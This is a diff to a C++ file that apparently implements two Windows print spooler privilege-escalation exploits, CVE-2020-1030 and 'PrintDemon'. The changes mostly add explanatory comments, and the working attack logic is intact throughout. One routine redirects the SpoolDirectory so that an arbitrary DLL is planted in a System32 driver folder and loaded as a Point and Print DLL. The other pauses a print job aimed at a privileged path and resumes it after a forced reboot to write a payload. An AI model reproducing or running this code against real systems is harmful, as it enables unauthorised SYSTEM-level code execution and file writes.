@@ -19,16 +19,23 @@ using std::string;
 	5. setting C:\\Windows\System32\spool\drivers\x64\4\malicious.dll as PointAndPrint DLL, it will be loaded: DONE!
 
 	malicious.dll, imitating as a Point and Print DLL, must export the SpoolerCopyFileEvent function.
-	This function is called once the module is loaded into the process.
+	This function is called once the module is loaded into the process.		
+
+	parameters of the function: 
+	 - printerName: name of the printer we are considering 
+	 - filePath: path to the dll or file that has to be 
+	 - isRestarted: boolean variable indicating if the program has been called after a reboot or not
 */
-
-
 void cve_2020_1030(wchar_t* printerName, wchar_t* filePath, bool isRestarted) {
 
+	// path of the v4 printer driver directory 
 	wchar_t* v4DriverDir = const_cast<wchar_t*>(L"C:\\Windows\\System32\\spool\\drivers\\x64\\4");
+	
+	// open considered directory 
 	HANDLE hPrinter = OpenPrinter(printerName);
-	DWORD cbData, dwStatus;
+	DWORD cbData, dwStatus; // utils variables 
 
+	// check if the program is executed after a reboot 
 	if (isRestarted) {
 		// check if v4 driver directory has been correctly created 
 		if (!doesDirExists(v4DriverDir)) {
@@ -36,11 +43,12 @@ void cve_2020_1030(wchar_t* printerName, wchar_t* filePath, bool isRestarted) {
 			return;
 		}
 		cout << "[+] v4 directory successfully created" << endl;
-
-		// move cve_2020_1030.dll inside that directory 
+		
+		// path and name of the files that will be created inside the System32 directory 
 		wchar_t* newFilePath = const_cast<wchar_t*>(L"C:\\Windows\\System32\\spool\\drivers\\x64\\4\\cve_2020_1030.dll"),
 			* newFileName = const_cast<wchar_t*>(L"cve_2020_1030.dll"); 
 
+		// move the file passed as parameter inside the newFilePath inside the cve_2020_1030.dll 
 		if (!MoveFile(filePath, newFilePath)) {
 			cout << "[-] Error while copying the DLL inside v4 directory" << endl;
 			return;
@@ -60,8 +68,11 @@ void cve_2020_1030(wchar_t* printerName, wchar_t* filePath, bool isRestarted) {
 	}
 	else {
 		cbData = ((DWORD)wcslen(v4DriverDir) + 1) * sizeof(WCHAR); // size of the value 
+
+		// request to update the spool directory 
 		dwStatus = SetPrinterDataEx(hPrinter, L"\\", L"SpoolDirectory", REG_SZ, (LPBYTE)v4DriverDir, cbData);
 
+		// check if the spool directory has been updated successfully 
 		if (dwStatus != ERROR_SUCCESS) {
 			cout << "[-] Error while setting SpoolDirectory to v4: " << dwStatus << endl;
 			return;
@@ -76,16 +87,19 @@ void cve_2020_1030(wchar_t* printerName, wchar_t* filePath, bool isRestarted) {
 }
 
 /*
-	1. driver Generic / Text Only
-	2. port pointing to a privileged location of the file system
+	1. consider a driver Generic / Text Only
+	2. consider a port pointing to a privileged location of the file system
 	3. create printer with the previous driver and port
 	4. start printing inside the port
 	5. pause the printing job
-	6. reboot & see
+	6. reboot and restart the job 
 */
 void print_demon(wchar_t* printerName, std::string payload, bool isRestarted) {
 	
+	// check if the program has been started after a reboot 
 	if (!isRestarted) {
+
+		// create a handle to the considered printer 
 		HANDLE hPrinter = OpenPrinter(printerName);
 
 		// start the printing job 
@@ -95,12 +109,14 @@ void print_demon(wchar_t* printerName, std::string payload, bool isRestarted) {
 		docInfo.pDocName = const_cast<wchar_t*>(L"Document");
 		DWORD jobID = StartDocPrinter(hPrinter, 1, (LPBYTE)&docInfo);
 
+		// check if the printing job has been correctly created 
 		if (jobID == 0) {
 			cout << "[-] Impossible to start the printing job" << endl;
 			return;
 		}
 		cout << "[+] Printing job correctly started, with ID: " << jobID << endl;
 
+		// start the printing process 
 		DWORD dwNeeded = (DWORD)strlen(payload.c_str());
 		char* pText = const_cast<char*>(payload.c_str());
 		if (!WritePrinter(hPrinter, pText, dwNeeded, &dwNeeded)) {
@@ -108,23 +124,29 @@ void print_demon(wchar_t* printerName, std::string payload, bool isRestarted) {
 			return;
 		}
 		cout << "[+] Correctly started to print" << endl;
-		EndDocPrinter(hPrinter);
+		EndDocPrinter(hPrinter); 
 
+		// pause the print job 
 		if (!SetJob(hPrinter, jobID, 0, NULL, JOB_CONTROL_PAUSE)) {
 			cout << "[-] Error while pausing the printing job, error: " << GetLastError() << endl;
 			return;
 		}
 		cout << "[+] Correctly paused the job" << endl;
 
+		// request the application to be started after the reboot and start the reboot 
 		registerApplicationAndRestartSystem();
 	}
 	else {
-		// unpause the printing job
+		// get handle to the considered printer 
 		HANDLE hPrinter = OpenPrinter(printerName);
+
+		// struct used to store print job information 
 		JOB_INFO_1* pJobInfo = NULL;
+
+		// helper variable 
 		DWORD dwNeeded, dwReturned;
 
-		//Get amount of memory needed
+		// Get amount of memory needed to store the current jobs inside the printing queue 
 		if (!EnumJobs(hPrinter, 0, 1, 1, NULL, 0, &dwNeeded, &dwReturned)) {
 			if (GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
 				cout << "[-] Error while obtaining memory necessary to enumerate printing jobs, error: " << GetLastError() << endl;
@@ -133,8 +155,10 @@ void print_demon(wchar_t* printerName, std::string payload, bool isRestarted) {
 		}
 		cout << "[+] Successfully obtained memory necessary, " << dwNeeded << "\t" << dwReturned << endl;
 
-		//Allocate the memory
+		// allocate a job info pointer using the data obtained before 
 		pJobInfo = (JOB_INFO_1*)malloc(dwNeeded);
+
+		// enumerate the print queue jobs 
 		if (!EnumJobs(hPrinter, 0, 1, 1, (LPBYTE)pJobInfo, dwNeeded, &dwNeeded, &dwReturned)) {
 			cout << "[-] Error while obtaining first element of the queue, error: " << GetLastError() << endl;
 			return;
@@ -145,6 +169,7 @@ void print_demon(wchar_t* printerName, std::string payload, bool isRestarted) {
 		}
 		cout << "[+] Successfully obtained first element of the queue, id: " << pJobInfo[0].JobId << endl;
 
+		// access to the first job in the queue and unpause it 
 		if (SetJob(hPrinter, pJobInfo[0].JobId, 0, NULL, JOB_CONTROL_RESUME)) {
 			if (GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
 				cout << "[-] Error while resuming the print job, error: " << GetLastError() << endl;
